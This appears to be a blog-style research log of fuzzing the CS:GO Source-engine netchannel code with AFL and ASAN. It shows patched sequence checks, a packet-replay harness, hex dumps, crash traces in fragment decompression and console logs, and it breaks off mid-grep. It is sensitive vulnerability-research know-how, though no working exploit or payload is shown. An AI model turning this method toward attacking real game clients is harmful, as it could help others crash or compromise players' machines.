	if ( flags & PACKET_FLAG_RELIABLE )
	{
		int i, bit = 1<<msg.ReadUBitLong( 3 );

		for ( i=0; i<MAX_STREAMS; i++ )
		{
			if ( msg.ReadOneBit() != 0 )
			{
				if ( !ReadSubChannelData( msg, i ) ) {
					// MODIFIED:
					
					Warning("!ReadSubChannelData( msg, i )\n");
					ConMsg("!ReadSubChannelData( msg, i )\n");

					return; // error while reading fragments, drop whole packet
				}
			}
		}

		// flip subChannel bit to signal successfull receiving
		FLIPBIT(m_nInReliableState, bit);
		
		for ( i=0; i<MAX_STREAMS; i++ )
		{
			if ( !CheckReceivingList( i ) )
				return; // error while processing 
		}
	}




```
{% endraw %}

the flags are taken from the packet itself as a byte inside of it.

in protocol.h :

{% raw %}
```
#define PACKET_FLAG_RELIABLE			(1<<0)	// packet contains subchannel stream data
```
{% endraw %}

Now we know that the problem occurs in ReadSubChannelData. My first guess is that it is something to do with the

{% raw %}
```
bool CNetChan::ReadSubChannelData( bf_read &buf, int stream  )
{
	dataFragments_t * data = &m_ReceiveList[stream]; // <--- THIS LINE HERE!!!!!!!!!!
	int startFragment = 0;
	int numFragments = 0;
	unsigned int offset = 0;
	unsigned int length = 0;
```
{% endraw %}

data thing . Wait after looking at the rest of the code it seems that it is actually supposed fill in that thing.

I think that we can patch the thing by simply patching this out:

{% raw %}
```
	if (sequence <= m_nInSequenceNr ) // <- if this fails, then the thing won't work.
	{
		if ( net_showdrop.GetInt() )
		{
			if ( sequence == m_nInSequenceNr )
			{
```
{% endraw %}
we can just do:

{% raw %}
```
    sequence = m_nInSequenceNr+1;
	if (sequence <= m_nInSequenceNr )
	{
		if ( net_showdrop.GetInt() )
		{
			if ( sequence == m_nInSequenceNr )
			{

```
{% endraw %}

later we also do this patch:

{% raw %}
```

		subChannel_s * subchan = &m_SubChannels[i];
		sequence_ack = subchan->sendSeqNr;             // <- This patch here.
		Assert( subchan->index == i);

		if ( (m_nOutReliableState & bitmask) == (relState & bitmask) )
		{
			if ( subchan->state == SUBCHANNEL_DIRTY )

```
{% endraw %}


This is surprisingly difficult because we need to make sure to handle all of the fragmented packet shit.

Wait that actually worked??

Just flat out ignoring the fragmented packets worked? Now I am getting more coverage and also some crashes but I suspect that the vast majority of these crashes will be false positive, because they are caused by the changes which we made.

Anyway, lets let it fuzz for a while now.


------------------------------------------------------------------------


## Results of the first fuzz run:

After fuzzing the program for a while I got some crashes. As I said previously, most of these I suspect are false positives caused by our modding of the code. To reproduce these crashes we need a way to playback these packets. The problem is that the unmodified program expects the packets to occur in a certain sequence, so I think that we need to do the same modding as before aka use an if check to check if is_fuzzing is true and if yes then ignore packets which are not in order. Also another thing is that we should of course ignore the checksum calculation.

I think that the https://github.com/brymko/csgo-exploits repository contained some sample code which is used to replay the packet, but I think that it would be easiest to just patch the code in the similar manner as before and then read the packet from a file to the buffer and so on.

And it seems that the thread actually crashes when we replay the packet! Quite good! Now I think that we need to compile the client with -DUSE_ASAN=1 and observe the asan report.

Observing the asan crash report we actually crash on this:

{% raw %}
```

bool CNetChan::CheckReceivingList(int nList)
{
	dataFragments_t * data = &m_ReceiveList[nList]; // get list
	
	if ( data->buffer == NULL )
		return true;

	if ( data->ackedFragments < data->numFragments )
		return true;

	if ( data->ackedFragments > data->numFragments )
	{
		ConMsg("Receiving failed: too many fragments %i/%i from %s\n", data->ackedFragments, data->numFragments, GetAddress() );
		return false;
	}

	// got all fragments

	if ( net_showfragments.GetBool() )
		ConMsg("Receiving complete: %i fragments, %i bytes\n", data->numFragments, data->bytes );

	if ( data->isCompressed )
	{
		UncompressFragments( data ); // <- We crash here.
	}

```
{% endraw %}

So the crash basically happens when handling the fragmented packets. The packets which we wanted to avoid. *facepalm*

here is this code in UncompressFragments:

{% raw %}
```

	char *newbuffer = new char[PAD_NUMBER( data->nUncompressedSize, 4 )];
	unsigned int uncompressedSize = data->nUncompressedSize;

```
{% endraw %}

The m_ReceiveList is filled with the ReadSubChannelData function.

{% raw %}
```

bool CNetChan::ReadSubChannelData( bf_read &buf, int stream  )
{
	dataFragments_t * data = &m_ReceiveList[stream]; // get list
	int startFragment = 0;
	int numFragments = 0;
	unsigned int offset = 0;
	unsigned int length = 0;
	
	bool bSingleBlock = buf.ReadOneBit() == 0; // is single block ?

	if ( !bSingleBlock )
	{
		ConMsg("Not a single block packet!\n");
		startFragment = buf.ReadUBitLong( MAX_FILE_SIZE_BITS-FRAGMENT_BITS ); // 16 MB max
		numFragments = buf.ReadUBitLong( 3 );  // 8 fragments per packet max
		offset = startFragment * FRAGMENT_SIZE;
		length = numFragments * FRAGMENT_SIZE;
	}

	if ( offset == 0 ) // first fragment, read header info
	{
		data->filename[0] = 0;
		data->isCompressed = false;
		data->isReplayDemo = false;
		data->transferID = 0;

		if ( bSingleBlock )
		{
			// data compressed ?
			if ( buf.ReadOneBit() )
			{
				data->isCompressed = true;
				data->nUncompressedSize = buf.ReadUBitLong( MAX_FILE_SIZE_BITS );
			}
			else
			{
				data->isCompressed = false;
			}

			data->bytes = buf.ReadUBitLong( NET_MAX_PAYLOAD_BITS );
		}
		else
		{
		
			if ( buf.ReadOneBit() ) // is it a file ?
			{
				data->transferID = buf.ReadUBitLong( 32 );
				buf.ReadString( data->filename, MAX_OSPATH );

				// replay demo?
				if ( buf.ReadOneBit() )
				{
					data->isReplayDemo = true;
				}
			}

			// data compressed ?
			if ( buf.ReadOneBit() )
			{
				data->isCompressed = true;
				data->nUncompressedSize = buf.ReadUBitLong( MAX_FILE_SIZE_BITS );
			}
			else
			{
				data->isCompressed = false;
			}
				
			data->bytes = buf.ReadUBitLong( MAX_FILE_SIZE_BITS );
		}

		if ( data->buffer )
		{
			// last transmission was aborted, free data
			delete [] data->buffer;
			data->buffer = NULL;
			ConDMsg("Fragment transmission aborted at %i/%i from %s.\n", data->ackedFragments, data->numFragments, GetAddress() );
			ConMsg("Fragment transmission aborted at %i/%i from %s.\n", data->ackedFragments, data->numFragments, GetAddress() );
		}

		data->bits = data->bytes * 8; 
		data->asTCP = false;
		data->numFragments = BYTES2FRAGMENTS(data->bytes);
		data->ackedFragments = 0;
		data->file = FILESYSTEM_INVALID_HANDLE;

		if ( bSingleBlock )
		{
			numFragments = data->numFragments;
			length = numFragments * FRAGMENT_SIZE;
		}

		if ( data->bytes > MAX_FILE_SIZE )
		{
			// This can happen with the compressed path above, which uses VarInt32 rather than MAX_FILE_SIZE_BITS
			Warning( "Net message exceeds max size (%u / %u)\n", MAX_FILE_SIZE, data->bytes );
			// Subsequent packets for this transfer will treated as invalid since we never setup a buffer.
			return false;
		}

		if ( data->isCompressed && data->nUncompressedSize > MAX_FILE_SIZE )
		{
			// This can happen with the compressed path above, which uses VarInt32 rather than MAX_FILE_SIZE_BITS
			Warning( "Net message uncompressed size exceeds max size (%u / compressed %u / uncompressed %u)\n", MAX_FILE_SIZE, data->bytes, data->nUncompressedSize );
			ConMsg("Net message uncompressed size exceeds max size (%u / compressed %u / uncompressed %u)\n", MAX_FILE_SIZE, data->bytes, data->nUncompressedSize);
			// Subsequent packets for this transfer will treated as invalid since we never setup a buffer.
			return false;
		}

		data->buffer = new char[ PAD_NUMBER( data->bytes, 4 ) ];
	}
	else
	{
		if ( data->buffer == NULL )
		{
			// This can occur if the packet containing the "header" (offset == 0) is dropped.  Since we need the header to arrive we'll just wait
			//  for a retry
			ConMsg("Received fragment out of order: %i/%i\n", startFragment, numFragments );
			Warning("Received fragment out of order: %i/%i\n", startFragment, numFragments );
			return false;
		}
	}
	
	if ( (startFragment+numFragments) == data->numFragments )
	{
		// we are receiving the last fragment, adjust length
		int rest = FRAGMENT_SIZE - ( data->bytes % FRAGMENT_SIZE );
		if ( rest < FRAGMENT_SIZE )
			length -= rest;
	}
	else if ( (startFragment+numFragments) > data->numFragments )
	{
		// a malicious client can send a fragment beyond what was arranged in fragment#0 header
		// old code will overrun the allocated buffer and likely cause a server crash
		// it could also cause a client memory overrun because the offset can be anywhere from 0 to 16MB range
		// drop the packet and wait for client to retry
		ConDMsg("Received fragment chunk out of bounds: %i+%i>%i from %s\n", startFragment, numFragments, data->numFragments, GetAddress() );
		ConMsg("Received fragment chunk out of bounds: %i+%i>%i from %s\n", startFragment, numFragments, data->numFragments, GetAddress() );
		return false;
	}

	Assert ( (offset + length) <= data->bytes );

	buf.ReadBytes( data->buffer + offset, length ); // read data

	data->ackedFragments+= numFragments;

	if ( net_showfragments.GetBool() )
		ConMsg("Received fragments: start %i, num %i\n", startFragment, numFragments );

	return true;
}



```
{% endraw %}

I think that the reason why our code does not work is that when the packet is normally processed, we also run this code:

{% raw %}
```
	{
		AUTO_LOCK_FM( s_NetChannels );

		// get streaming data from channel sockets
		int numChannels = s_NetChannels.Count();

		for ( int i = (numChannels-1); i >= 0 ; i-- )
		{
			CNetChan *netchan = s_NetChannels[i];

			// sockets must match
			if ( sock != netchan->GetSocket() )
				continue;

			if ( !netchan->ProcessStream() )
			{
				netchan->GetMsgHandler()->ConnectionCrashed("TCP connection failed.");
			}
		}
	}
```
{% endraw %}

in NET_ProcessSocket . Therefore the previous packets which were sent before our fuzzing packets are messing up our fuzzing. Looking at the code a bit more we can see that there is a ::Clear method for a netchannel.

{% raw %}
```

void CNetChan::Clear()
{
	int i;

	// clear waiting lists

	for ( i=0; i<MAX_STREAMS; i++ )
	{
		while ( m_WaitingList[i].Count() )
			RemoveHeadInWaitingList( i );	

		if ( m_ReceiveList[i].buffer )
		{
			delete[] m_ReceiveList[i].buffer;
			m_ReceiveList[i].buffer = NULL;
		}
	}

	for( i=0; i<MAX_SUBCHANNELS; i++ )
	{
		if ( m_SubChannels[i].state == SUBCHANNEL_TOSEND )
		{
			int bit = 1<<i; // flip bit back since data was send yet
			
			FLIPBIT(m_nOutReliableState, bit);

			m_SubChannels[i].Free(); 
		}
		else if ( m_SubChannels[i].state == SUBCHANNEL_WAITING )
		{
			// data is already out, mark channel as dirty
			m_SubChannels[i].state = SUBCHANNEL_DIRTY;
		}
	}

	m_bStopProcessing = true;

	Reset();
}


```
{% endraw %}

there is also another function NET_CreateNetChannel:

{% raw %}
```


INetChannel *NET_CreateNetChannel( int socket, const ns_address *adr, const char * name, INetChannelHandler * handler, const byte *pbEncryptionKey, bool bForceNewChannel )
{
	CNetChan *chan = NULL;

	if ( !bForceNewChannel && adr != NULL )
	{
		// try to find real network channel if already existing
		if ( ( chan = NET_FindNetChannel( socket, *adr ) ) != NULL )
		{
			// channel already known, clear any old stuff before Setup wipes all
			chan->Clear();
		}
	}

	if ( !chan )

```
{% endraw %}

So I think that the attack plan is to call this function first on the netchannel.

After doing that we should call this:

{% raw %}
```

void CNetChan::GetSequenceData( int &nOutSequenceNr, int &nInSequenceNr, int &nOutSequenceNrAck )
{
	nOutSequenceNr = m_nOutSequenceNr;
	nInSequenceNr = m_nInSequenceNr;
	nOutSequenceNrAck = m_nOutSequenceNrAck;
}

```
{% endraw %}

to get the sequence information and then I think that we should patch the packet which the fuzzer generates for us and replace those values in it in the appropriate spots.

There is a handy cheatsheet if you will in SendDatagram, but we will get to that a bit later.

Looking more closely at the ProcessPacket function we see that:

{% raw %}
```

	msg.Seek( 0 );

	if ( remote_address.IsValid() && !packet->from.CompareAdr ( remote_address ) )
	{
		Warning("remote address is not valid\n");
		ConMsg("remote address is not valid rgrerger\n");
		return;
	}
#if defined( NET_PARANOID_DUMPS )
	g_NetParanoid.StartPacket( msg );
#endif
	// Update data flow stats
	FlowUpdate( FLOW_INCOMING, packet->wiresize + UDP_HEADER_SIZE );

	int flags = 0;

	if ( bHasHeader	)
	{
		flags = ProcessPacketHeader( packet );
	}

	if ( flags == -1 ) {
		ConMsg("ProcessPacketHeader failed with return code -1\n");
		Warning("ProcessPacketHeader failed with return code -1\n");
		return; // invalid header/packet
	}

...

int CNetChan::ProcessPacketHeader( netpacket_t * packet )
{
	// get sequence numbers		
	int sequence	= packet->message.ReadLong();
	int sequence_ack= packet->message.ReadLong();
	int flags		= packet->message.ReadByte();

...
	
```
{% endraw %}

The sequence number is the very first number in the packet and the sequence acknowledgement is next and then the flag byte is next.


in bitbuf.h :

{% raw %}
```

FORCEINLINE int CBitRead::ReadLong( void )
{
	return ( int ) ReadUBitLong( sizeof(int32) << 3 );
}


```
{% endraw %}

So the ReadLong function reads 32 bits from the message.

Also there is an acknowledgement message of some kind at every other message:

{% raw %}
```


cyberhacker@cyberhacker-h8-1131sc:~/Fuzzingpackets/game/corpus$ xxd packet101.dat 
00000000: 3300 0000 3300 0000 003f 3100 0000 0000  3...3....?1.....
cyberhacker@cyberhacker-h8-1131sc:~/Fuzzingpackets/game/corpus$ xxd packet103.dat 
00000000: 3400 0000 3400 0000 00ef 2501 0000 0000  4...4.....%.....
cyberhacker@cyberhacker-h8-1131sc:~/Fuzzingpackets/game/corpus$ xxd packet105.dat 
00000000: 3500 0000 3500 0000 003f 3100 0000 0000  5...5....?1.....
cyberhacker@cyberhacker-h8-1131sc:~/Fuzzingpackets/game/corpus$ xxd packet107.dat 
00000000: 3600 0000 3600 0000 00ef 2501 0000 0000  6...6.....%.....
cyberhacker@cyberhacker-h8-1131sc:~/Fuzzingpackets/game/corpus$ xxd packet109.dat 
00000000: 3700 0000 3700 0000 003f 3100 0000 0000  7...7....?1.....



```
{% endraw %}

the order to do things do dump messages is:

Order:
- Intercept
- Decrypt (ICE)
- Skip header (first byte of packet is header length)
- Read payload (first byte after header is size, next is payload itself)
- Decompress using LZSS if first byte of payload is NET_HEADER_FLAG_COMPRESSED(-3) (first byte should be LZSS_ID and next is decompressed_size)

We are basically at this point:

- At this point we got an actual packet. Now read 12-byte header: sequence(4), sequence_ack(4), flags(1), checksum(2), rel_state(1)
- Now check if you should decrypt/decompress payload (PACKET_FLAG_COMPRESSED(1<<1)/PACKET_FLAG_ENCRYPTED(1<<2))
- Dont forget to skip/read few bytes if there is PACKET_FLAG_CHOKED(1<<4, skip 1 byte) or PACKET_FLAG_CHALLENGE(1<<5, skip 4 bytes)
- Now read/skip subchannels data if there is PACKET_FLAG_RELAIBLE. I dont really want to write this here, because this is pain in ass.
- And if there is any unread data left, you finnaly got your protobuf messages!
- First VarInt32 is message_id, and another VarInt32 is message_size.

Let's add more debugging messages to the code and log a couple of more packets.

Also the very first packet has sequence set to one:

{% raw %}
```
cyberhacker@cyberhacker-h8-1131sc:~/Fuzzingpackets/game/corpus$ xxd -g 1 packet000.dat 
00000000: 01 00 00 00 00 00 00 00 00 3f 31 00 00 00 00 00  .........?1.....

```
{% endraw %}
So I was actually right that m_nInSequenceNr should always be basically one less than the sequence in the packet.

The sequence_ack on the other hand is bit more tricky. Now looking at the packets themselves it looks like it should always be the same as 





always the same as m_nOutSequenceNr .

because in UpdateSubChannels

{% raw %}
```
freeSubChan->sendSeqNr = 0;
```
{% endraw %}

Except looking now at the debugging messages in the log it looks like that is actually not the case.

NS_CLIENT socket is zero.

Looking at the code it looks like the NET_SendLoopPacket does not compress or encrypt the messages, so I think that that would be really handy for fuzzing since we do not need to deal with that shit.

Also I think that we should only dump packets when we receive them with NET_SendLoopPacket because otherwise we get a lot of the server message shit and also we should only dump when sending to the client aka socket 0 .

NET_SendLoopPacket

The attack plan will basically be this:

Ensure that we are fuzzing on the NS_CLIENT socket.
Call Clear on the channel before starting fuzzing.
Ensure that the packets which we send are actually in sequence by patching the sequence number in the packet.

The thing is that I have no clue how the subchan->sendSeqNr gets modified. I honestly don't get it. Now logging only the loopback packets it still does not jump out for me.

The subchannel shit seems to only occur because we are also sending stuff with SendDatagram.



void CNetChan::GetSequenceData( int &nOutSequenceNr, int &nInSequenceNr, int &nOutSequenceNrAck )
{
	nOutSequenceNr = m_nOutSequenceNr;
	nInSequenceNr = m_nInSequenceNr;
	nOutSequenceNrAck = m_nOutSequenceNrAck;
}

	m_nInSequenceNr = sequence;
	m_nOutSequenceNrAck = sequence_ack;

#define PACKET_FLAG_RELIABLE			(1<<0)	// packet contains subchannel stream data
#define PACKET_FLAG_COMPRESSED			(1<<1)	// packet is compressed
#define PACKET_FLAG_ENCRYPTED			(1<<2)  // packet is encrypted
#define PACKET_FLAG_SPLIT				(1<<3)  // packet is split
#define PACKET_FLAG_CHOKED				(1<<4)  // packet was choked by sender



------------------

Ok so after a bit of typing, the patching of the packets seem to work. Here is the code for it:

{% raw %}
```
	netchan->Clear();

	for (int i = 0; i<100000; i++) {

		if (netchan->GetSocket() != 0) {
			ConMsg("Channel socket is not NS_CLIENT!\n");
			Warning("Warning: Channel socket is not NS_CLIENT!\n");

		}

		fp = fopen("/home/cyberhacker/Codecoveragething/game/crashthing/thirdcrash.bin", "rb");

		if (fp != NULL) {
		    length = fread(packet_buffer, sizeof(char), scratch.Size(), fp);
		    if ( ferror( fp ) != 0 ) {
		        fputs("Error reading file", stderr);
		    } else {
		        //source[length++] = '\0';
		    }

		    fclose(fp);
		}

		if (fp == NULL) {
			continue;
			Warning("File pointer is null\n");
			ConMsg("File pointer is null\n");

			Warning("inputfilething is %s\n", inputfilething);
			ConMsg("inputfilething is %s\n", inputfilething);
		}
	  	
	  	//memset(packet_buffer, 0, MAX_INPUT_SIZE);
	  	//int len = __AFL_FUZZ_TESTCASE_LEN;
	  	//packet = NET_GetPacketmodded(socket, scratch.GetBuffer(), buf, len);


				/*
	
		int InSequenceNumber = 0;
		int OutSequenceNumberAck = 0;

	int InSequenceNumber = 0;
	int OutSequenceNumberAck = 0;
	int OutSequenceNumber = 0; // not used



	m_nInSequenceNr+1

		*/

		/*

		void CNetChan::GetSequenceData( int &nOutSequenceNr, int &nInSequenceNr, int &nOutSequenceNrAck )
{
	nOutSequenceNr = m_nOutSequenceNr;
	nInSequenceNr = m_nInSequenceNr;
	nOutSequenceNrAck = m_nOutSequenceNrAck;
}

		*/


		// Patch m_nInSequenceNr and m_nOutSequenceNrAck

		// log the unpatched packet 
		netchan->GetSequenceData(OutSequenceNumber, InSequenceNumber, OutSequenceNumberAck);
		patchpacket(OutSequenceNumber, InSequenceNumber, OutSequenceNumberAck, flags, packet_buffer);
		debug_messages = 1;
		packet = NET_GetPacketmodded(socket, scratch.GetBuffer(), packet_buffer, length);

		

		

		ConMsg("GetSequenceData returned these:\n");

		ConMsg("OutSequenceNumber: 0x%x\n", OutSequenceNumber);
		ConMsg("InSequenceNumber: 0x%x\n", InSequenceNumber);
		ConMsg("OutSequenceNumberAck: 0x%x\n", OutSequenceNumberAck);

		

		
	  	// NET_MAX_MESSAGE is the length of the buffer:
		NET_LogPacketthing(packet);






	  	//get_new_packet(packet, scratch.GetBuffer());

	  	//NET_LogPacketfuzz(packet);
		Warning("Processing crashing packet now:\n");
		ConMsg("Processing the packet now:\n");

	  	netchan->ProcessPacket(packet, true);


  	}



```
{% endraw %}

This code is in the not-fuzzing version aka just the client which we test stuff on before moving to fuzzing itself. When I run this the packets which are produced look like this:


{% raw %}
```

Calling ProcessMessages!
Netchannel: unknown net message (255) from loopback.
unknown message
 Dumping messages for channel Noob(loopback) 0x0x629000352200
Header bits 80, flags == 0
0 messages
Raw
PKT  >>  ....y................... 19010000 79000000 00ffffff ffffffff ffffffff ffffffff   
PKT  >>  ........................ ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff   
PKT  >>  ........................ ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff   
PKT  >>  ........................ ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAAAAAAAA 41414141 41414141 41414141 41414141 41414141 41414141   
PKT  >>  AAAAAAAAAAAAAAAAAA       41414141 41414141 41414141 41414141 4141  

```
{% endraw %}

This is taken from the console.log file from the client.

As you can see, the very start of the packet gets patched succesfully and it fails on the unknown message part aka it tries to call the handler for that message.

In the fuzzing session however we get very strange behaviour:


{% raw %}
```

sequence <= m_nInSequenceNr
sequence <= m_nInSequenceNr
ProcessPacketHeader failed with return code -1
ProcessPacketHeader failed with return code -1
Checking stuff:
sequence <= m_nInSequenceNr
sequence <= m_nInSequenceNr
ProcessPacketHeader failed with return code -1
ProcessPacketHeader failed with return code -1
Checking stuff:
sequence <= m_nInSequenceNr
sequence <= m_nInSequenceNr
ProcessPacketHeader failed with return code -1
ProcessPacketHeader failed with return code -1
Checking stuff:
sequence <= m_nInSequenceNr
sequence <= m_nInSequenceNr
ProcessPacketHeader failed with return code -1
ProcessPacketHeader failed with return code -1
Checking stuff:
sequence <= m_nInSequenceNr
sequence <= m_nInSequenceNr
ProcessPacketHeader failed with return code -1
ProcessPacketHeader failed with return code -1
Checking stuff:


```
{% endraw %}


this is from the console.log file from the fuzzing session itself. I am doing everything else the same except in the fuzzing version the __AFL_LOOP macro and stuff is added. Back to debugging!


This code piece should let us know if the patching of the packets actually works:

{% raw %}
```

		packet = NET_GetPacketmodded(socket, scratch.GetBuffer(), packet_buffer, len);

		NET_LogPacketthingunpatched(packet); // log unpatched packet

		netchan->GetSequenceData(OutSequenceNumber, InSequenceNumber, OutSequenceNumberAck);
		patchpacket(OutSequenceNumber, InSequenceNumber, OutSequenceNumberAck, flags, packet_buffer, len);
		//patchpacket(OutSequenceNumber, InSequenceNumber, OutSequenceNumberAck, flags, packet_buffer, length);
		//debug_messages = 1;
		packet = NET_GetPacketmodded(socket, scratch.GetBuffer(), packet_buffer, len);

		NET_LogPacketthing(packet); // log patched packet


		// The patching of the packets does not work in the fuzzing loop for some obscure reason so these debug messages are for that.
		
		ConMsg("GetSequenceData returned these:\n");

		ConMsg("OutSequenceNumber: 0x%x\n", OutSequenceNumber);
		ConMsg("InSequenceNumber: 0x%x\n", InSequenceNumber);
		ConMsg("OutSequenceNumberAck: 0x%x\n", OutSequenceNumberAck);
		
		

		
	  	// NET_MAX_MESSAGE is the length of the buffer:
		//NET_LogPacketthing(packet);


```
{% endraw %}


After recompile I get this error for some reason:

{% raw %}
```
Failed to load the launcher(bin/linux64/launcher_client.so) (../../lib/public/linux64/libsteam_api.so: cannot open shared object file: No such file or directory)


```
{% endraw %}

Even though that library definitely exists.

I found out that to fix the problem you basically need to remove every already compiled binary (aka remove bin/linux64/ and csgo/bin/linux64 directories altogether and then recreate them and then recompile).

I had to also increase the timeout to obscene amounts because apparently the logging of the individual packets seems to take a lot of system calls and the write to disk seems to take quite a while.

After compiling again the sequence <= m_nInSequenceNr issue seems to be gone somehow?

Now, sometimes in the console.log we get Disconnects for some reason. I think that it could be a) the packets which we throw against it are actually the disconnect messages or b) the netchannel gets closed :

{% raw %}
```

void CNetChan::Shutdown(const char *pReason)
{
	// send discconect

	if ( m_Socket < 0 )
		return;

	Clear(); // free all buffers (reliable & unreliable)

	if ( pReason )
	{
		// send disconnect message
		CNETMsg_Disconnect_t disconnect;
		disconnect.set_text( pReason );
		disconnect.WriteToBuffer( m_StreamUnreliable );
		Transmit();	// push message out
	}
...

```
{% endraw %}

and:

{% raw %}
```
bool CNetChan::NETMsg_Disconnect( const CNETMsg_Disconnect& msg )
{
#ifdef DEDICATED
	m_MessageHandler->ConnectionClosing( "Disconnect" );
#else
	m_MessageHandler->ConnectionClosing( msg.text().c_str() );
#endif
	return false;
}



```
{% endraw %}

after looking at the logs, it looks like we are actually passing a packet which calls the disconnect NETMsg_Disconnect function, so we are not messing something else up which causes a disconnect. It is purely because of our own actions (well technically everything is but you get my point).

So I think that if we patch out the NETMsg_Disconnect function, then we should be fine.

The next hurdle would be to solve the `Netchannel: failed reading message <MESSAGENUMBER> from loopback.` errors which we are now getting in our log.

Here is the relevant code:

{% raw %}
```

		INetMessageBinder *pMsgBind = ((CNetChan *)m_pActiveChannel)->FindMessageBinder( cmd, 0 );
		if ( pMsgBind )
		{
			int startbit = buf.GetNumBitsRead();
				
			INetMessage	* netmsg = pMsgBind->CreateFromBuffer( buf );
			if ( !netmsg )
			{
				Msg( "Netchannel: failed reading message %d from %s.\n", cmd, GetAddress() );
				Assert ( 0 );
				return false;
			}



```
{% endraw %}

in netmessages.h :

{% raw %}
```

		virtual INetMessage *CreateFromBuffer( bf_read &buffer )
		{
			INetMessage *pMsg = new typename _N::MyType_t;
			if ( !pMsg->ReadFromBuffer( buffer ) )
			{
				delete pMsg;
				return NULL;
			}
			return pMsg;
		}

```
{% endraw %}

and

{% raw %}
```
	virtual bool ReadFromBuffer( bf_read &buffer )
	{
		int size = buffer.ReadVarInt32();
		if ( size < 0 || size > NET_MAX_PAYLOAD )
		{
			return false;
		}

		// Check its valid
		if ( size > buffer.GetNumBytesLeft() )
		{
			return false;
		}

		// If the read buffer is byte aligned, we can parse right out of it
		if ( ( buffer.GetNumBitsRead() % 8 ) == 0 )
		{
			bool parseResult = PB_OBJECT_TYPE::ParseFromArray( buffer.GetBasePointer() + buffer.GetNumBytesRead(), size );
			buffer.SeekRelative( size * 8 );
			return parseResult;
		}

		// otherwise we have to do a temp allocation so we can read it all shifted
#ifdef NET_SHOW_UNALIGNED_MSGS
		DevMsg("Warning: unaligned read of protobuf message %s (%d bytes)\n", PB_OBJECT_TYPE::GetTypeName().c_str(), size );
#endif

		void *parseBuffer = stackalloc( size );
		if ( !buffer.ReadBytes( parseBuffer, size ) )
		{
			return false;
		}

		if ( ! PB_OBJECT_TYPE::ParseFromArray( parseBuffer, size ) )
		{
			return false;
		}

		return true;
	}


```
{% endraw %}

and then the places where ParseFromArray is called are these:

{% raw %}
```
cyberhacker@cyberhacker-h8-1131sc:~/Fuzzingpackets/Kisak-Strike$ grep --exclude-dir=cmake-build/ -iRl ParseFromArray
gcsdk/protobufsharedobject.cpp
gcsdk/msgprotobuf.cpp
gcsdk/gcbase.cpp
game/shared/usermessages.h
